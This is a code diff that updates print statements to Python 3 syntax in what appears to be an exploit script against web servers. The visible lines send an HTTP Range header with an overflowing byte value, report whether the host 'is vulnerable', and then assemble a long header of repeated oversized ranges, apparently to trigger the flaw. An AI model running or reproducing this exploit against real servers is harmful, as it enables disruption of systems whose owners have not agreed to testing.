@@ -37,13 +37,13 @@ if __name__ == '__main__':
     headers = {"Range":"bytes=0-18446744073709551615"}
     r = requests.get(url, headers=headers, verify=False)
     if not "Requested Range Not Satisfiable" in r.reason:
-        print "[-] {}:{} is not vulnerable".format(cmd_options.host,cmd_options.port)
+        print ("[-] {}:{} is not vulnerable".format(cmd_options.host,cmd_options.port))
         sys.exit(0)
     elif "The request has an invalid header name" in r.text:
-        print "[-] {}:{} is not vulnerable".format(cmd_options.host,cmd_options.port)
+        print ("[-] {}:{} is not vulnerable".format(cmd_options.host,cmd_options.port))
         sys.exit(0)                
     if (cmd_options.check is True):
-        print "[+] {}:{} is vulnerable".format(cmd_options.host,cmd_options.port)
+        print ("[+] {}:{} is vulnerable".format(cmd_options.host,cmd_options.port))
         sys.exit(0)
 
     range_chunk = "1-18446744073709551615"  
@@ -58,5 +58,5 @@ if __name__ == '__main__':
             range_header += ","
             range_header += range_chunk     
         else:
-            print "Max header length reached"
+            print ("Max header length reached")
             sys.exit(0)
